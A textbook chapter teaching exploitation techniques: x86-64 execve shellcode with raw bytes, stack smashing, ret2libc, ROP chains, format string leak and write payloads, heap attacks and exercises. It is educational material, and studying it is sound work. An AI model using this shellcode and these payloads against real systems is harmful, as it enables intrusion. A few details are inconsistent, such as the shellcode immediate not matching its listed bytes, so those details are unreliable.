\chapter{Exploitation Techniques}
\label{ch:exploitation}

\epigraph{``An exploit is not magic. It is a precise sequence of machine operations that follows the same rules as any other program.''}{}

\learninggoal{
	\item Write and understand x86-64 shellcode for common primitives.
	\item Construct a stack-based buffer overflow exploit with controlled code execution.
	\item Understand return-oriented programming (ROP) and its variants.
	\item Explain how format string exploits achieve arbitrary read and write.
	\item Trace the evolution of exploitation techniques in response to mitigations.
}

\section{From Bug to Exploit}

A memory-corruption bug gives the attacker a \emph{primitive}: the ability to read or write memory beyond intended bounds. Exploitation is the process of elevating that primitive into full control over the victim process.

\begin{definition}[Exploitation Primitive]
	An \textbf{exploitation primitive} is a low-level capability obtained through a vulnerability. Common primitives include:
	\begin{itemize}
		\item \textbf{Arbitrary read:} read any address in the process's address space.
		\item \textbf{Arbitrary write:} write any value to any address.
		\item \textbf{Control flow hijack:} redirect the instruction pointer to an attacker-controlled address.
	\end{itemize}
\end{definition}

\section{Shellcode}

Shellcode is position-independent machine code that performs a desired action. The name comes from the classic goal: spawn a shell (\texttt{/bin/sh}). Modern shellcode can do anything---execute a command, establish a reverse connection, or patch memory.

\begin{definition}[Shellcode]
	\textbf{Shellcode} is a sequence of machine-code bytes designed to be injected into a process and executed. It must be \emph{position-independent} (no absolute addresses) and typically avoids null bytes (which would terminate string-based injection vectors).
\end{definition}

\subsection{A Minimal Shellcode: execve("/bin/sh")}

The classic shellcode executes \texttt{execve("/bin/sh", NULL, NULL)}:

\begin{lstlisting}[language=ASM, caption=x86-64 execve shellcode]
  ; execve("/bin/sh", NULL, NULL)
  xor  %rdx, %rdx      # rdx = 0 (envp = NULL)
  xor  %rsi, %rsi      # rsi = 0 (argv = NULL)
  mov  $0x68732f6e69622f, %rax   # rax = "/bin//sh" (little-endian)
  push %rax
  mov  %rsp, %rdi      # rdi = pointer to "/bin//sh"
  xor  %rax, %rax
  mov  $59, %al        # rax = 59 (execve syscall number)
  syscall
\end{lstlisting}

The bytes (27 bytes, null-free):

\begin{lstlisting}[language=ASM]
  48 31 d2    48 31 f6    48 b8 2f 62 69 6e 2f 2f 73 68
  50          48 89 e7    48 31 c0    b0 3b    0f 05
\end{lstlisting}

Note the use of \texttt{/bin//sh} (with double slash) to produce an 8-byte value that fits in a register. The double slash is harmless: the kernel normalises it to \texttt{/bin/sh}.

\subsection{Null-Free Constraint}

Many injection vectors (e.g., \texttt{strcpy}, \texttt{sprintf}) stop copying at the first null byte. Shellcode must not contain \texttt{0x00}. Common techniques:

\begin{itemize}
	\item Use \texttt{xor reg, reg} instead of \texttt{mov reg, 0}.
	\item Use \texttt{mov \$0xFF, \%al; inc \%al} instead of \texttt{mov \$0, \%al}.
	\item Use \texttt{shl} to construct constants without null bytes.
\end{itemize}

\begin{example}[Null-Free xor Trick]
	To zero a register: \texttt{xor \%rax, \%rax} (2 bytes: \texttt{48 31 c0}). To set \texttt{rax = 59}: \texttt{xor \%rax, \%rax; mov \$59, \%al} (5 bytes: \texttt{48 31 c0 b0 3b}).
\end{example}

\section{Classic Stack Smashing}

With no mitigations (no NX, no ASLR, no stack canary), exploiting a stack buffer overflow is straightforward:

\begin{lstlisting}[caption=Classic exploitation layout]
  Buffer address: 0x7fffffffe000
  Return address: 0x7fffffffe040

  [AAAA...AAAA][BBBBBBBB][CCCCCCCC]
   |-- shellcode --|-- rbp --|-- return address --|

  return address = buffer_address (= 0x7fffffffe000)
\end{lstlisting}

The attacker:
\begin{enumerate}
	\item Fills the buffer with shellcode (padded to the exact buffer size).
	\item Overwrites saved \texttt{rbp} (can be arbitrary, 8 bytes).
	\item Overwrites the return address with the buffer's address.
\end{enumerate}

When \texttt{ret} executes, \texttt{rip} jumps to the shellcode.

\subsection{NOP Sleds}

In practice, the attacker may not know the exact buffer address. A \emph{NOP sled} mitigates this: a sequence of \texttt{nop} (0x90) instructions before the shellcode:

\begin{lstlisting}[caption=NOP sled]
  [90 90 90 ... 90][shellcode][overwritten rbp][target address]
  |-- NOP sled (~half the buffer) --|
\end{lstlisting}

If \texttt{rip} lands anywhere in the NOP sled, execution slides into the shellcode. The sled increases the probability of successful exploitation by a factor equal to the sled length divided by the page size.

\section{Return-to-libc (ret2libc)}

When NX (\ref{ch:memory-model}) prevents execution of shellcode on the stack, attackers turn to \emph{code reuse}. Return-to-libc redirects execution to existing library functions.

\begin{lstlisting}[caption=ret2libc exploit layout]
  [padding to fill buffer][saved rbp][return address][argument 1][argument 2]

  return address = address of system() in libc
  argument 1    = address of "/bin/sh" string in libc
\end{lstlisting}

The stack is crafted so that when \texttt{vulnerable} returns, \texttt{rip} lands at \texttt{system()}, and the stack contains the argument pointer. This calls \texttt{system("/bin/sh")} without injecting any code.

\begin{definition}[Return-to-libc (ret2libc)]
	A code-reuse technique that hijacks the return address to call an existing library function (commonly \texttt{system}) with attacker-controlled arguments on the stack.
\end{definition}

\section{Return-Oriented Programming (ROP)}

ret2libc calls a single function. Return-Oriented Programming~\cite{shacham2007return} chains multiple short instruction sequences (\emph{gadgets}), each ending with \texttt{ret}, to perform arbitrary computation.

\begin{definition}[ROP Gadget]
	A \textbf{ROP gadget} is a sequence of a few instructions ending with \texttt{ret} (0xC3). Gadgets are found within existing executable code (libc, the binary itself). The attacker chains gadgets by placing their addresses sequentially on the stack.
\end{definition}

Each \texttt{ret} pops the next gadget address from the stack and jumps to it. The ROP chain is essentially a program written in stack entries:

\begin{lstlisting}[caption=ROP chain on the stack]
  High addresses
  +---------------------------+
  | gadget_3_address          |  <- ret from gadget_2 jumps here
  +---------------------------+
  | argument for gadget_2     |
  +---------------------------+
  | gadget_2_address          |  <- ret from gadget_1 jumps here
  +---------------------------+
  | argument for gadget_1     |
  +---------------------------+
  | gadget_1_address          |  <- overwritten return address
  +---------------------------+
  Low addresses
\end{lstlisting}

\subsection{Finding Gadgets}

Gadgets are found by scanning executable memory for \texttt{ret} (0xC3) bytes and looking backward for useful instruction sequences. Tools like \texttt{ROPgadget}, \texttt{ropper}, and \texttt{radare2} automate this:

\begin{lstlisting}[language=Radare2]
  $ r2 /bin/ls
  [0x100001180]> /R ret
  ...
  0x100003510: 58 59 c3  (pop rax; pop rcx; ret)
  0x100003520: 5b c3     (pop rbx; ret)
  ...
\end{lstlisting}

A useful ROP chain typically requires gadgets for:

\begin{itemize}
	\item Loading values into registers (\texttt{pop reg; ret}).
	\item Writing to memory (\texttt{mov [reg], reg; ...; ret}).
	\item Performing syscalls (\texttt{syscall; ret}).
	\item Adjusting the stack pointer (\texttt{add rsp, N; ret}).
\end{itemize}

\subsection{Example: ROP execve}

A minimal ROP chain to call \texttt{execve("/bin/sh", NULL, NULL)} on x86-64:

\begin{lstlisting}[caption=Conceptual ROP chain]
  Stack layout (growing upward):
  Address of: pop_rdi; ret     # gadget to pop rdi
  Address of: "/bin/sh" string # value loaded into rdi
  Address of: pop_rsi; ret     # gadget to pop rsi
  0                            # rsi = NULL
  Address of: pop_rdx; ret     # gadget to pop rdx (if available)
  0                            # rdx = NULL
  Address of: pop_rax; ret     # gadget to pop rax
  59                           # rax = execve syscall number
  Address of: syscall; ret     # invoke syscall
\end{lstlisting}

\section{Format String Exploitation}

Format string bugs provide both an information leak and a write primitive.

\subsection{Memory Leak}

The attacker supplies \texttt{\%p.\%p.\%p.\%p} to \texttt{printf}. Each \texttt{\%p} reads and prints a 64-bit value from the stack:

\begin{lstlisting}[caption=Leaking stack values]
  Input:  %p.%p.%p.%p.%p.%p
  Output: 0x7fffffffe000.0x7f00000000fc.(nil).0x7ffff7a... 
\end{lstlisting}

By positioning the format string buffer on the stack, the attacker can read specific stack positions. The \texttt{\%N\$p} syntax reads the Nth argument directly:

\begin{lstlisting}[caption=Direct parameter access]
  Input:  %6$p        # read the 6th stack argument
  Output: 0x7ffff7dd0b80  # likely a libc address (ASLR leak)
\end{lstlisting}

Leaking a libc address defeats ASLR (\ref{ch:protections}): the attacker computes the base address and derives addresses of \texttt{system}, gadgets, and other targets.

\subsection{Arbitrary Write with \%n}

The \texttt{\%n} specifier writes the number of bytes output so far to a pointer on the stack. The attacker places the target address on the stack (within the format buffer) and uses \texttt{\%N\$n} to write to it:

\begin{lstlisting}[caption=Writing to an arbitrary address]
  // Target address (8 bytes in little-endian) placed at the
  // start of the format buffer, followed by format specifiers.
  // \x00\xe0\xff\xff\xff\x7f\x00\x00  = 0x7fffffffe000
  // Then: %125c%6$hhn  writes 125 to byte at 0x7fffffffe000
	
  // %125c    prints 125 characters (sets count to 125)
  // %6$hhn   writes the count (125 = 0x7d) as a single byte
  //          to the address at the 6th argument position
\end{lstlisting}

Multiple \texttt{\%hhn} writes are combined to write a full 64-bit pointer one byte at a time.

\section{Heap Exploitation}

Heap exploitation is more complex than stack exploitation and depends on the specific allocator. Common techniques include:

\begin{longtable}{p{3.5cm}p{5cm}p{4cm}}
	\toprule
	\textbf{Technique}  & \textbf{Mechanism}               & \textbf{Target}            \\
	\midrule
	Tcache poisoning    & Overwrite tcache next pointer    & Arbitrary allocation       \\
	Fastbin attack      & Corrupt fastbin free list        & Arbitrary write            \\
	House of Force      & Overflow into top chunk size     & Arbitrary allocation       \\
	Use-after-free      & Reallocate freed object          & Type confusion             \\
	Unsorted bin attack & Write to unsorted bin bk pointer & Arbitrary write via unlink \\
	\bottomrule
\end{longtable}

\begin{principle}[Heap Exploitation Is Allocator-Specific]
	Heap exploitation techniques are tightly coupled to a particular allocator implementation and version. The transition from glibc \texttt{ptmalloc} to \texttt{jemalloc} or \texttt{mimalloc} completely changes the attack surface.
\end{principle}

\section{The Exploitation Pipeline}

Modern exploitation against hardened systems follows a general pipeline:

\begin{enumerate}
	\item \textbf{Information leak:} leak a code or libc pointer to defeat ASLR.
	\item \textbf{Address computation:} compute base addresses and gadget locations.
	\item \textbf{Memory corruption:} trigger the vulnerability to gain an arbitrary write.
	\item \textbf{Code execution:} overwrite a function pointer, return address, or vtable with a ROP chain.
	\item \textbf{Payload delivery:} execute the final shellcode (via \texttt{mprotect} + NX bypass or pure ROP).
\end{enumerate}

\section{Exercises}

\begin{exercise}
	Modify the \texttt{execve} shellcode to execute \texttt{/bin/cat /etc/passwd} instead of \texttt{/bin/sh}. What changes are needed?
\end{exercise}

\begin{exercise}
	Given a buffer of 128 bytes on the stack with NX enabled and ASLR disabled, construct a ret2libc payload that calls \texttt{system("/bin/sh")}. Assume \texttt{system} is at \texttt{0x7ffff7a3d580} and the string \texttt{"/bin/sh"} is at \texttt{0x7ffff7b99e17}.
\end{exercise}

\begin{exercise}
	In a format string exploit, what does \texttt{\%100c\%12\$hn} do? If the target address (placed at position 12 on the stack) is \texttt{0x7fffffffe000}, what value is written?
\end{exercise}

\begin{exercise}
	Research the Blinding ROP technique~\cite{bittau2014hacking}. How does it bypass ASLR without an information leak?
\end{exercise}
